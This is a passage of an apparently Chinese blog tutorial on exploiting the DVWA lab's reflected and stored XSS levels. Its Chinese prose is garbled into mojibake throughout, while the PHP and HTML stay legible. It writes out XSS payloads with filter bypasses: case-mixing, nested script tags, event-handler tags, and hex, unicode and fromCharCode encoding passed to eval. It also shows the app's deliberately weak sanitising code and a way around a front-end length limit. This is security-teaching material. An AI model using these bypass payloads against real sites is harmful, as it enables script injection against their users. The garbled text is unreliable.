å‚æ•°çŠ¶æ€ï¼š</p><p>http://localhost/dvwa-master/vulnerabilities/xss_r/</p><p>å¦ä¸€æ–¹é¢ï¼Œæ£€æŸ¥æˆ‘ä»¬å¦‚æœæäº¤äº† name å‚æ•°ï¼Œname å‚æ•°æ˜¯å¦ä¸ºç©º</p><p>åªæœ‰æ»¡è¶³æäº¤äº† nameå‚æ•°å¹¶ä¸”è¯¥å‚æ•°ä¸ä¸ºç©ºçš„æ¡ä»¶ä¸‹ï¼Œæ‰ä¼šæ‰§è¡Œåé¢çš„è¯­å¥ã€‚</p><p>ä»£ç ç›´æ¥é‡‡ç”¨<code>get</code>æ–¹å¼ä¼ å…¥äº†<code>name</code>å‚æ•°ï¼Œåé¢ç›´æ¥ç”¨ä¸€ä¸ªhtmlå˜é‡æ¥æ‹¼æ¥æˆ‘ä»¬çš„å‚æ•°ï¼Œå¹¶æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ä¸æ£€æŸ¥ï¼Œå­˜åœ¨æ˜æ˜¾çš„<code>XSS</code>æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ä½¿ç”¨script æ ‡ç­¾å³å¯ã€‚</p><h2 id="meduim">meduim</h2><p>é»‘ç›’æµ‹è¯•</p><ol type="1"><li><p>æ¢æµ‹ XSS</p><p>è¾“å…¥ç‹¬ä¸€æ— äºŒå­—ç¬¦ä¸²ï¼Œæœç´¢å¹¶åœ¨å¼€å‘è€…å·¥å…·ä¸­å¯¹åº”æŸ¥çœ‹ï¼Œå‘ç°å‰ç«¯æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«</p></li><li><p>æµ‹è¯• xss</p><p>&lt;script&gt;alert(1)&lt;/script&gt;</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/dvwa/dvwa_reflected_xss_medium.png" /></p><p>ç»“æœå‘ç°äº‹æƒ…æ²¡é‚£ä¹ˆç®€å•ï¼Œå¾ˆæ˜æ˜¾åç«¯è¿‡æ»¤äº† scriptæ ‡ç­¾ï¼Œä¸‹é¢æˆ‘ä»¬æ¥ç»•è¿‡å®ƒçš„è¿‡æ»¤ã€‚</p><p>ç»•è¿‡æ–¹å¼ï¼ˆä¸ SQL æ³¨å…¥çš„æŸäº›ç»•è¿‡æ–¹å¼ä¸€æ ·ï¼‰ï¼š</p><ol type="1"><li><p>å¤§å°å†™ç»•è¿‡ï¼ˆå¦‚æœä»–åªè¿‡æ»¤å°å†™çš„ script æ ‡ç­¾ï¼Œå¯ä»¥ç»•è¿‡ï¼‰</p><p>&lt;sCript&gt;alert(1)&lt;/scRipt&gt;</p><p>ç»•è¿‡æˆåŠŸ</p></li><li><p>åµŒå¥—ç»•è¿‡ï¼ˆå¦‚æœå®ƒåªè¿‡æ»¤ä¸€æ¬¡ script æ ‡ç­¾ï¼Œä¾¿å¯ä»¥ç»•è¿‡ï¼‰</p><p>å¯ä»¥å°è¯•ä¸¤ç§ï¼š</p><p>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</p><p>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/scr&lt;/script&gt;ipt&gt;</p><p>æˆ‘ä»¬å‘ç°ç¬¬ä¸€ç§ç»•è¿‡äº†ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆç¬¬äºŒç§ä¸è¡Œå‘¢ï¼Ÿä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆé—­æ ‡ç­¾ä¸ç”¨åµŒå¥—å‘¢ï¼Ÿåé¢æˆ‘ä»¬ç™½ç›’æµ‹è¯•å°†ä»£ç çš„æ—¶å€™å†è®²ã€‚</p></li></ol></li></ol><p>ä»£ç è®²è§£</p><p>ä¸Šä»£ç ï¼Œmedium.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>medium åŸºäºé»‘åå•çš„æ€æƒ³è¿›è¡Œè¿‡æ»¤ã€‚if åˆ¤æ–­å’Œ low ä¸€æ ·ï¼Œè¿™é‡Œå¤šäº†ä¸€ä¸ªstr_replace å‡½æ•°ï¼Œå°† script æ ‡ç­¾çš„å¼€æ ‡ç­¾ &lt;script&gt;ç»™æ›¿æ¢ä¸ºäº†ç©ºæ ¼ï¼Œè€Œæ²¡æœ‰å¯¹å…¶é—­æ ‡ç­¾ &lt;/script&gt;è¿›è¡Œå¤„ç†ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¹‹å‰ä½¿ç”¨å¼€é—­æ ‡ç­¾éƒ½åµŒå¥—çš„æ–¹å¼å¤±è´¥çš„åŸå› äº†ã€‚</p><p>æ³¨ï¼š</p><p>php å˜é‡ååŠ  â€œ {} â€ ä¸»è¦æ˜¯ä¸ºäº†åŒºåˆ†å˜é‡ä¸æ–‡æœ¬ã€‚</p><p>ä¸€æ–¹é¢æ˜¯ä¸ºäº†é˜²æ­¢å˜é‡åå’Œåé¢çš„å­—ç¬¦ä¸²è¿åœ¨ä¸€èµ·ï¼Œå¦ä¸€æ–¹é¢æ˜¯æ€•å˜é‡åä¸­æœ‰ç©ºæ ¼å•¥çš„ï¼ˆå½“ç„¶ï¼Œå’±è¿™ä¸ªname æ²¡æœ‰ç©ºæ ¼å•¥çš„ï¼‰ï¼Œæ²¡æœ‰ä»€ä¹ˆå…¶å®ƒçš„ä½œç”¨ã€‚</p><h2 id="high">high</h2><p>é»‘ç›’æµ‹è¯•</p><p>é‡å¤å‰é¢çš„æ­¥éª¤ï¼Œæˆ‘ä»¬å‘ç°æ— æ³•ç»•è¿‡ scriptçš„è¿‡æ»¤ï¼Œç°åœ¨æˆ‘ä»¬å­¦ä¹ ä¸€äº›æ ‡ç­¾æ¥è§¦å‘ XSSã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">@</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™äº›éƒ½å¯ä»¥ï¼Œå½“ç„¶ï¼Œè¿˜æœ‰ä¸€äº›æ›´éšè”½çš„ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;\<span class="attr">u0061</span>\<span class="attr">u006c</span>\<span class="attr">u0065</span>\<span class="attr">u0072</span>\<span class="attr">u0074</span>\<span class="attr">u0028</span>\<span class="attr">u0031</span>\<span class="attr">u0029</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸¤ä¸ªåˆ†åˆ«æ˜¯ä½¿ç”¨ alert(1) çš„ 16 è¿›åˆ¶ç¼–ç å’Œ unicodeç¼–ç ï¼Œè¿™æ ·å¯ä»¥ç»•è¿‡å¯¹ alert ç­‰å‡½æ•°çš„è¿‡æ»¤ã€‚</p><p>æ³¨ï¼šjavascript ä¸­çš„ eval å’Œåˆ«çš„è¯­è¨€çš„ evalå‡½æ•°åŠŸèƒ½ä¸€æ ·ï¼Œéƒ½æ˜¯æ¥æ”¶å­—ç¬¦ä¸²ï¼Œå°†å­—ç¬¦ä¸²å½“åšå‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure><p>String.fromCharCode æ˜¯è¿”å› UTF-16 çš„ unicodeç¼–ç å¯¹åº”çš„å­—ç¬¦/å­—ç¬¦ä¸²ã€‚ï¼ˆç›´æ¥ç”¨ hackbar çš„ String.fromCharCodeåŠ è§£å¯†å³å¯ï¼‰</p><p>ä»£ç è®²è§£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>preg_replace()å‡½æ•°ç”¨äºæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ï¼Œè¿™ä½¿å¾—åŒå†™ç»•è¿‡ã€å¤§å°å†™æ··æ·†ç»•è¿‡ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ä¸­i è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼‰ä¸å†æœ‰æ•ˆã€‚</p><p>(._)æ­£åˆ™è¡¨è¾¾å¼(._)æ¶‰åŠåˆ°è´ªå©ªæ¨¡å¼ã€‚å½“æ­£åˆ™è¡¨è¾¾å¼ä¸­åŒ…å«èƒ½æ¥å—é‡å¤çš„é™å®šç¬¦æ—¶ï¼Œé€šå¸¸çš„è¡Œä¸ºæ˜¯ï¼ˆåœ¨ä½¿æ•´ä¸ªè¡¨è¾¾å¼èƒ½å¾—åˆ°åŒ¹é…çš„å‰æä¸‹ï¼‰åŒ¹é…å°½å¯èƒ½å¤šçš„å­—ç¬¦ã€‚ä»¥è¿™ä¸ªè¡¨è¾¾å¼ä¸ºä¾‹ï¼ša.*bï¼Œå®ƒå°†ä¼šåŒ¹é…æœ€é•¿çš„ä»¥a å¼€å§‹ï¼Œä»¥ b ç»“æŸçš„å­—ç¬¦ä¸²ã€‚å¦‚æœç”¨å®ƒæ¥æœç´¢ aabab çš„è¯ï¼Œå®ƒä¼šåŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²aababã€‚è¿™è¢«ç§°ä¸ºè´ªå©ªåŒ¹é…ã€‚æ‰€ä»¥ç¬¬ä¸€ä¸ªç¨‹åºç¬¬ä¸€ä¸ªåˆ†ç»„åŒ¹é…çš„çš„ç»“æœæ˜¯ Foundvalue:This order was placed forQT300ï¼Œå°½å¯èƒ½åŒ¹é…å¤šçš„å­—ç¬¦ï¼ˆå› ä¸ºç¬¬äºŒç»„è¿˜è¦åŒ¹é…æ•°å­—ï¼Œæ‰€ä»¥åŒ¹é…åˆ° 300ï¼‰</p><p>æ‰€ä»¥æˆ‘ä»¬ä¸€å¼€å§‹è¾“å…¥ï¼š&lt;script&gt;alert(1)</script>ï¼Œ ä»æœ€æ—©çš„&lt;åˆ°æœ€æ™šçš„ t ï¼Œä¸­é—´å…¨éƒ¨è¢«è¿‡æ»¤æ‰äº†ï¼Œåªå‰©ä¸‹ä¸€ä¸ª &gt;ã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/dvwa/dvwa_reflected_xss_high.png" /></p><h2 id="impossible">impossible</h2><p>é»‘ç›’æµ‹è¯•</p><p>ç›´æ¥æµ‹è¯•ï¼š&lt;script&gt;alert(/xss/)&lt;/script&gt;</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/dvwa/dvwa_reflected_xss_impossible.png" /></p><p>å›æ˜¾ï¼šHello&lt;script&gt;alert(/xss/)</script>ï¼Œå®ƒå°†ä½ è¾“å…¥çš„ç‰¹æ®Šå­—ç¬¦éƒ½å®Œå¥½çš„å›æ˜¾å‡ºæ¥ï¼Œåˆ°äº†è¿™ç§æ—¶å€™ï¼Œä½ å¿ƒé‡Œè¦æœ‰ä¸€å¥è¯ï¼šæ˜¯æ—¶å€™æ”¾å¼ƒäº†...</p><p>æˆ‘ä»¬åœ¨å¼€å‘è€…å·¥å…·ä¸­å®šä½ï¼Œå¹¶ edit as htmlå‘ç°ï¼Œæœä¸å…¶ç„¶ï¼Œå¤§äºå°äºå·éƒ½ç»™å®ä½“åŒ–äº†ï¼Œå—¯ï¼Œä¸æ„§æ˜¯ impossibleã€‚</p><p>ä»£ç è®²è§£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>htmlspecialchars() å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦(" &amp; &lt;&gt; ' )è½¬æ¢ä¸º HTMLå®ä½“ã€‚è¿™æ ·å°±åŸºæœ¬æœç»äº† XSSã€‚</p><p>æ­¤å¤–ï¼Œåœ¨æ­¤å‡½æ•°ä¸­ï¼Œé»˜è®¤ä¸ç¼–ç å•å¼•å·ï¼Œè¦åŠ ä¸Š ENT_QUOTESå‚æ•°æ‰ä¼šç¼–ç å•å¼•å·ã€‚åœ¨ dvwaä¸­ä¸ç¼–ç å•å¼•å·æ²¡æœ‰é£é™©ï¼Œä½†æ˜¯åœ¨å…¶ä»–åœºæ™¯ä¸‹ï¼Œå•å¼•å·å°±å¯èƒ½ä¼šè¢«åˆ©ç”¨</p><h1 id="stored-xss">Stored XSS</h1><p>æ¸©é¦¨æç¤ºï¼šå­˜å‚¨å‹ xss ä¼šä¸€ç›´æœ‰ï¼Œå¯¹åç»­ä½¿ç”¨ dvwaä¸å‹å¥½ï¼Œè¿˜è¦è‡ªå·±å»æ•°æ®åº“åˆ é™¤ï¼Œå¯ä»¥é€‰æ‹© Setup/Reset DB æ¥é‡ç½® dvwa</p><p>é»‘ç›’æµ‹è¯•</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬æµ‹è¯• Message æ ï¼Œæˆ‘ä»¬åœ¨ Name æ è¾“å…¥ Helloï¼Œ åœ¨ Messageæ è¾“å…¥ &lt;script&gt;alert(/xss/)&lt;/script&gt;ï¼ŒæˆåŠŸå¼¹çª—ã€‚</p><p>ç„¶åï¼Œæˆ‘ä»¬æµ‹è¯• Name æ ï¼Œæˆ‘ä»¬å°è¯•åœ¨ Name æ è¾“å…¥&lt;script&gt;alert(/xss/)&lt;/script&gt;ï¼Œä½†æ˜¯å‘ç°å®ƒé™åˆ¶äº†é•¿åº¦ï¼ˆä¸€èˆ¬ï¼Œä½ åœ¨è¾“å…¥é‚£é‡Œè¾“ç€è¾“ç€ï¼Œè¾“ä¸åŠ¨äº†ï¼Œå°±æ˜¯å‰ç«¯é™åˆ¶ï¼‰ï¼Œæ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œæˆ‘ä»¬çœ‹åˆ°ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;txtName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">size</span>=<span class="string">&quot;30&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;10&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²é•¿åº¦æœ€é•¿ä¸º10ï¼Œæ­¤é•¿åº¦é™åˆ¶ä¸º<strong>å‰ç«¯é™åˆ¶</strong>ï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹å¼çªç ´</p><ol type="1"><li>ç›´æ¥ F12 åœ¨ Elements ä¸­çš„å¯¹åº”é•¿åº¦å¤„ï¼Œæ”¹é•¿åº¦</li><li>burp suite æŠ“åŒ…ï¼Œç›´æ¥æ”¹ name çš„å€¼</li></ol><p>ç„¶åï¼Œæµ‹è¯•å¼¹çª—æˆåŠŸã€‚</p><p>ä»£ç è®²è§£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line"><span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="comment">//ä»£ç åŸºæœ¬åŒä¸Šï¼ˆæˆ‘è¿™é‡Œä¸æŠ„è¿‡æ¥äº†ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>trim() å‡½æ•°</p><p>ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚</p><p>è¯­æ³•ï¼štrim(string,charlist) è‹¥æ—  charlistï¼Œåˆ™ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦ï¼Œå¦åˆ™ï¼Œç§»é™¤ charlist ä¸­çš„å­—ç¬¦ã€‚</p><p>stripslashes() å‡½æ•°</p><p>åˆ é™¤ç”± <ahref="https://www.w3school.com.cn/php/func_string_addslashes.asp">addslashes()</a>å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚</p><p><strong>æç¤ºï¼š</strong>è¯¥å‡½æ•°å¯ç”¨äºæ¸…ç†ä»æ•°æ®åº“ä¸­æˆ–è€…ä» HTMLè¡¨å•ä¸­å–å›çš„æ•°æ®ã€‚</p><p>mysqli_real_escape_string å‡½æ•°</p><p>mysqli_real_escape_string() å‡½æ•°è½¬ä¹‰åœ¨ SQLè¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œç”¨æ¥é˜²æ­¢ SQLæ³¨å…¥ï¼Œä»…åœ¨å†™æ•°æ®åº“çš„æ—¶å€™æ‰éœ€è¦è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¹è¾“å…¥å¹¶æ²¡æœ‰åš XSS æ–¹é¢çš„è¿‡æ»¤ä¸æ£€æŸ¥ï¼ˆåšäº†å¯¹ SQLæ‰§è¡Œæ–¹é¢çš„æ£€æŸ¥ï¼Œæ‰€ä»¥ä¸å¤ªå¥½è¿›è¡Œ SQLæ³¨å…¥ï¼‰ï¼Œä¸”å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨æ˜æ˜¾çš„å­˜å‚¨å‹ XSS æ¼æ´ã€‚</p><h2 id="medium">medium</h2><p>é»‘ç›’æµ‹è¯•</p><p>é¦–å…ˆæµ‹è¯•ï¼ŒMessageï¼Œæµ‹è¯•ä»¥ä¸‹ payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(xss)&lt;/script&gt;</span><br><span class="line">&lt;img src=@ onerror=<span class="title function_ invoke__">alert</span>(/xss/)&gt;</span><br><span class="line">&lt;iframe onload=<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;body onload=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><p>å‡æœªæˆåŠŸï¼Œæ”¾å¼ƒ</p><p>æµ‹è¯• Nameï¼Œæµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(xss)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;scrIpt&gt;<span class="title function_ invoke__">alert</span>(xss)&lt;/sCript&gt;</span><br></pre></td></tr></table></figure><p>å¤§å†™é‚£ä¸ªæµ‹è¯•å¼¹çª—ï¼Œçœ‹æ¥å¯¹ Message åšäº†è¾ƒå¼ºçš„è¿‡æ»¤ï¼Œå¯¹ Nameåªåšäº†è¿‡æ»¤å°å†™ script æ ‡ç­¾çš„é»‘åå•ã€‚</p><p>å½“ç„¶ï¼ŒåŒå†™ä¹Ÿèƒ½ç»•è¿‡ï¼Œè¿™é‡Œå°±ä¸å†åšæ¼”ç¤ºäº†ã€‚</p><p>ä»£ç è®²è§£</p><p>å¤§è‡´ä»£ç ä¸ä¸Šé¢ low ç›¸åŒï¼Œä¸åŒçš„ç›¸ä¿¡æˆ‘ä»¬å‘€çŒœå‡ºæ¥äº†ã€‚</p><p>$message å¤šäº†ä¸€æ­¥ htmlspecialchars çš„å¤„ç†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br></pre></td></tr></table></figure><p>$name å¤šäº†è¿‡æ»¤ &lt;script&gt; çš„æ“ä½œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> 